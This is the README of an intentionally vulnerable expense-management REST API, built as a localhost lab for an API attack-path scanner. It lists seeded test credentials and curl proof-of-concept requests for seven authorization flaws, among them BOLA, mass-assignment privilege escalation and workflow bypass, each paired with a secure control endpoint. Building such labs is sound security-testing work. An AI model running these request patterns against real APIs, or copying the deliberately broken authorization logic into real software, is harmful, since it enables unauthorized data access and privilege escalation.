# AcmeFlow API

A realistic, **intentionally vulnerable** Expense & Finance REST API, built
as a local security-testing lab for **APIAT (API Attack-Path Tester)** and
similar tools.

> ⚠️ **This is a deliberately insecure lab environment.** It contains fixed,
> documented authorization vulnerabilities on purpose. Run it only on
> `localhost` / in an isolated container network. Never deploy it to a
> shared, public, or production environment, and never reuse its
> `SECRET_KEY` or seed passwords anywhere else.

---

## 1. What this is

AcmeFlow simulates a small company's internal expense-management system:

- **Stack:** Python + FastAPI, PostgreSQL + SQLAlchemy, JWT auth (OAuth2
  password flow), Docker + Docker Compose, pytest, OpenAPI 3.x.
- **Roles:** `Employee`, `Manager`, `Finance`, `Admin`.
- **Entities:** Users, Projects, Expenses, Payments, Company Settings.
- **Workflow:** `DRAFT → SUBMITTED → APPROVED → PAID` (with `REJECTED` as a
  side branch).
- **7 intentional, documented vulnerabilities** (BOLA, BFLA, mass assignment
  / privilege escalation, payment BOLA, workflow bypass, admin authorization
  bypass, parameter tampering), each paired with a **secure control
  endpoint** doing the equivalent operation correctly, so a scanner can
  demonstrate both broken and correctly-protected behavior.

---

## 2. Quick start

### Option A: one-shot setup script

```bash
./setup.sh
docker compose up
```

`setup.sh` copies `.env.example` → `.env`, starts PostgreSQL, waits for it to
be healthy, builds the API image, and seeds deterministic test data.
`docker compose up` then starts (or restarts) the full stack.

### Option B: straight to Compose

```bash
cp .env.example .env
docker compose up --build
```

The `api` container automatically waits for PostgreSQL, runs
`python -m app.seed --reset`, and then starts Uvicorn.

Once running:

| URL | Purpose |
|---|---|
| http://localhost:8000/docs | Swagger UI (interactive; supports the "Authorize" button) |
| http://localhost:8000/redoc | ReDoc |
| http://localhost:8000/openapi.json | Raw OpenAPI 3.x spec |
| http://localhost:8000/health | Health check |

### Resetting the lab

The lab is fully deterministic. To wipe and reseed data at any time:

```bash
docker compose run --rm api python -m app.seed --reset
```

To reset everything, including the PostgreSQL volume, from scratch:

```bash
docker compose down -v
docker compose up --build
```

---

## 3. Test accounts

All accounts use the password pattern `<Name>#2024`. IDs are fixed by the
seed script and referenced throughout `apiat/roles.yaml`.

| Username | Password | Role | User ID | Department | Reports to |
|---|---|---|---|---|---|
| `admin` | `Admin#2024` | Admin | 1 | Operations | — |
| `bob` | `Bob#2024` | Manager | 2 | Engineering | — |
| `erin` | `Erin#2024` | Manager | 3 | Sales | — |
| `david` | `David#2024` | Finance | 4 | Finance | — |
| `alice` | `Alice#2024` | Employee | 5 | Engineering | bob |
| `carol` | `Carol#2024` | Employee | 6 | Engineering | bob |
| `frank` | `Frank#2024` | Employee | 7 | Sales | erin |

Seeded projects: `P-ENG-001` (Engineering, managed by bob),
`P-SALES-001` (Sales, managed by erin).

Seeded expenses (fixed IDs, spanning every workflow state):

| Expense ID | Owner | Status |
|---|---|---|
| 1 | alice | DRAFT |
| 2 | alice | SUBMITTED |
| 3 | alice | PAID |
| 4 | carol | SUBMITTED |
| 5 | frank | SUBMITTED |
| 6 | frank | APPROVED (payment pending) |

Seeded payments: payment `1` (COMPLETED, expense 3), payment `2` (PENDING,
expense 6).

### Logging in

The login endpoint uses the standard OAuth2 "password" grant (form-encoded,
not JSON) so it works directly with Swagger UI's "Authorize" button:

```bash
curl -X POST http://localhost:8000/api/v1/auth/login \
  -d "username=alice&password=Alice#2024"
```

```json
{ "access_token": "eyJhbGciOi...", "token_type": "bearer" }
```

Use the token as `Authorization: Bearer <token>` on subsequent requests.

---

## 4. Endpoints

| Method | Path | Notes |
|---|---|---|
| POST | `/api/v1/auth/login` | Get a JWT |
| GET | `/api/v1/users/me` | Own profile |
| PATCH | `/api/v1/users/me` | Own profile update — **vulnerable (VULN-3)** |
| GET | `/api/v1/users/{id}` | Secure: self / manager-of / admin only |
| GET | `/api/v1/projects` | Department-scoped list |
| GET | `/api/v1/projects/{id}` | Secure: department / project-manager / finance / admin |
| POST | `/api/v1/expenses` | Create a DRAFT expense (ownership derived server-side) |
| GET | `/api/v1/expenses` | List — **vulnerable to parameter tampering (VULN-7)** |
| GET | `/api/v1/expenses/{id}` | Get one — **vulnerable (BOLA, VULN-1)** |
| PUT | `/api/v1/expenses/{id}` | Edit — ownership enforced, but **workflow bypass (VULN-5)** |
| POST | `/api/v1/expenses/{id}/submit` | Secure |
| POST | `/api/v1/expenses/{id}/approve` | Secure (role + management-scope check) |
| POST | `/api/v1/expenses/{id}/reject` | **Vulnerable (BFLA, VULN-2)** |
| GET | `/api/v1/payments/{id}` | **Vulnerable (Payment BOLA, VULN-4)** |
| POST | `/api/v1/payments/{id}/process` | Secure |
| GET | `/api/v1/admin/users` | Secure (admin-only allowlist) |
| PATCH | `/api/v1/admin/users/{id}/role` | Secure (admin-only allowlist) |
| GET / PUT | `/api/v1/admin/settings[/{key}]` | **Vulnerable (admin bypass, VULN-6)** |

Full, always-accurate details are in the generated OpenAPI spec at
`/openapi.json` — the router docstrings mirror the vulnerability write-ups
below.

---

## 5. Intentional vulnerabilities

Each of the following is deterministic and reproducible against the seed
data above. `curl` examples assume the API is running on `localhost:8000`
and that you've already logged in (see §3).

### VULN-1 — BOLA on `GET /api/v1/expenses/{id}`

No ownership or role check at all. Any authenticated user can read any
expense by ID.

```bash
TOKEN=$(curl -s -X POST localhost:8000/api/v1/auth/login \
  -d "username=alice&password=Alice#2024" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

curl -s localhost:8000/api/v1/expenses/4 -H "Authorization: Bearer $TOKEN"
# 200 OK, returns carol's expense — alice should never see this.
```

**Secure contrast:** `GET /api/v1/users/{id}` correctly restricts to
self / manager-of-target / admin.

### VULN-2 — BFLA on `POST /api/v1/expenses/{id}/reject`

No role check whatsoever — a plain Employee can reject anyone's submitted
expense.

```bash
curl -s -X POST localhost:8000/api/v1/expenses/4/reject \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"reason": "rejected by an unrelated employee"}'
# 200 OK — should be 403.
```

**Secure contrast:** `POST /api/v1/expenses/{id}/approve` checks both role
*and* that the approving manager actually manages the expense owner.

### VULN-3 — Mass Assignment / Privilege Escalation on `PATCH /api/v1/users/me`

The update schema exposes `role` and `is_active`; the handler applies every
submitted field verbatim.

```bash
curl -s -X PATCH localhost:8000/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"role": "Admin"}'
# alice's role becomes Admin.
```

### VULN-4 — Payment BOLA on `GET /api/v1/payments/{id}`

No role or ownership check — any authenticated user can view any payment
record, including the `account_reference` field.

```bash
curl -s localhost:8000/api/v1/payments/2 -H "Authorization: Bearer $TOKEN"
# 200 OK, returns frank's pending payment details.
```

**Secure contrast:** `POST /api/v1/payments/{id}/process` correctly requires
`Finance`/`Admin` and validates both expense and payment state.

### VULN-5 — Workflow Bypass on `PUT /api/v1/expenses/{id}`

Ownership *is* enforced on this endpoint, but the `status` field is accepted
and applied with no state-machine validation.

```bash
EID=$(curl -s -X POST localhost:8000/api/v1/expenses \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"amount": 999.99, "category": "Travel", "description": "test"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['id'])")

curl -s -X PUT localhost:8000/api/v1/expenses/$EID \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"status": "PAID"}'
# Jumps straight from DRAFT to PAID, skipping submit/approve/process.
```

### VULN-6 — Administrative Authorization Bypass on `/api/v1/admin/settings`

Implemented as a **denylist** ("block Employee") instead of an **allowlist**
("require Admin"), unlike `/api/v1/admin/users`, which does it correctly.

```bash
BOBTOKEN=$(curl -s -X POST localhost:8000/api/v1/auth/login \
  -d "username=bob&password=Bob#2024" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

curl -s localhost:8000/api/v1/admin/settings -H "Authorization: Bearer $BOBTOKEN"
# 200 OK for a Manager — should be 403.
```

Employees are still correctly blocked here — a realistic example of a
*partial* fix that still leaves a privilege-escalation gap for other roles.

### VULN-7 — Parameter Tampering on `GET /api/v1/expenses?user_id=`

For Employee/Manager roles, the `user_id` query parameter is trusted
directly instead of always being derived from the caller's own identity.

```bash
curl -s "localhost:8000/api/v1/expenses?user_id=6" -H "Authorization: Bearer $TOKEN"
# alice (id 5) receives carol's (id 6) expenses.
```

---

## 6. Secure control endpoints

To make it easy for a scanner (or a person) to distinguish real findings from
noise, the following are **correctly implemented** and should be used as
negative controls / baselines:

- `POST /api/v1/expenses` — server derives ownership from the JWT.
- `POST /api/v1/expenses/{id}/submit` — ownership + state check.
- `POST /api/v1/expenses/{id}/approve` — role **and** manager-of-owner scope check.
- `GET /api/v1/users/{id}` — self / manager-of-target / admin only.
- `GET /api/v1/projects/{id}` — department / project-manager / finance / admin.
- `POST /api/v1/payments/{id}/process` — role + expense/payment state machine.
- `GET /api/v1/admin/users` — proper admin-only allowlist.
- `PATCH /api/v1/admin/users/{id}/role` — proper admin-only allowlist.

---

## 7. APIAT integration

`apiat/roles.yaml` is a ready-to-use configuration for APIAT (or any tool
that consumes a similar schema). It contains:

- `target` — base URL, `/openapi.json`, `/docs`, `/redoc`, `/health`.
- `auth` — the OAuth2 password flow used by `/api/v1/auth/login`, and the
  JWT claim names that carry identity (`sub`, `role`, `username`).
- `roles` — all seeded credentials, grouped by role.
- `resource_ownership` — the fixed IDs for users, projects, expenses,
  payments, and settings, so an attack-path tester can compute expected
  "should be 403" vs. "should be 200" outcomes without guessing.
- `endpoints` — for every endpoint: required auth, allowed roles/ownership,
  and (where relevant) which vulnerability class it demonstrates or which
  query/body field is tamperable.
- `workflows.expense_lifecycle` — the full state machine with the endpoint
  and allowed roles for each transition.
- `vulnerability_summary` — a flat list of all 7 vulnerabilities with IDs,
  categories, endpoints, and one-line reproduction steps, for quick scenario
  generation.

Point APIAT at:

```yaml
target.base_url: http://localhost:8000
target.openapi_url: http://localhost:8000/openapi.json
```

and load `apiat/roles.yaml` as its role/credential/ownership configuration.

---

## 8. Running the test suite

```bash
pip install -r requirements.txt
pytest
```

Tests run against an isolated local SQLite database (no Docker/Postgres
required) and reseed deterministic data before every single test, so test
order never matters. Coverage includes:

- `test_auth.py` — login, token validation.
- `test_bola.py` — VULN-1 plus the secure `GET /users/{id}` control.
- `test_bfla.py` — VULN-2 plus the secure `approve` control.
- `test_mass_assignment.py` — VULN-3.
- `test_payment_bola.py` — VULN-4 plus the secure `process` control.
- `test_workflow.py` — VULN-5, plus the full correct happy-path lifecycle.
- `test_admin_bypass.py` — VULN-6 plus the secure admin-user controls.
- `test_parameter_tampering.py` — VULN-7 plus the secure default-scope baseline.

---

## 9. Architecture

```
app/
  main.py           FastAPI app, router registration, OpenAPI metadata
  config.py         Environment-driven settings (pydantic-settings)
  database.py       SQLAlchemy engine/session/Base
  models.py         User, Project, Expense, Payment, CompanySetting
  schemas.py        Pydantic request/response models (secure + intentionally
                     over-permissive variants, clearly labeled)
  security.py       Password hashing (bcrypt), JWT creation
  deps.py           get_db, get_current_user, require_roles(*), get_or_404
  seed.py           Deterministic seed data (also the pytest fixture source)
  wait_for_db.py    Small readiness probe used by docker-compose
  routers/
    auth.py         POST /api/v1/auth/login
    users.py        /me, /{id}
    projects.py     /, /{id}
    expenses.py     create/list/get/update + submit/approve/reject
    payments.py     get/process
    admin.py        users, roles, settings
tests/              pytest suite (see §8)
apiat/roles.yaml    APIAT configuration (see §7)
```

Every intentional vulnerability is marked in code with a
`# --- VULN-N: <category> ---` comment block explaining exactly what's wrong
and what the secure version would check instead.

---

## 10. Scope and limitations

This lab focuses on **authorization** vulnerability classes (BOLA, BFLA,
mass assignment, workflow bypass, parameter tampering, admin bypass) because
those are the classes an attack-path tester like APIAT is built to chain
together. It does **not** include, and is not intended to demonstrate:

- Injection vulnerabilities (SQL injection, etc.) — all queries use the
  SQLAlchemy ORM with parameter binding.
- Malware, persistence mechanisms, or anything that reaches outside the
  local Docker network.
- Rate limiting / DoS scenarios.
- TLS/transport-level issues (the lab runs over plain HTTP on `localhost`
  by design).

If you extend this lab, please keep new vulnerabilities equally
well-documented, deterministic, and paired with a secure control where
possible.
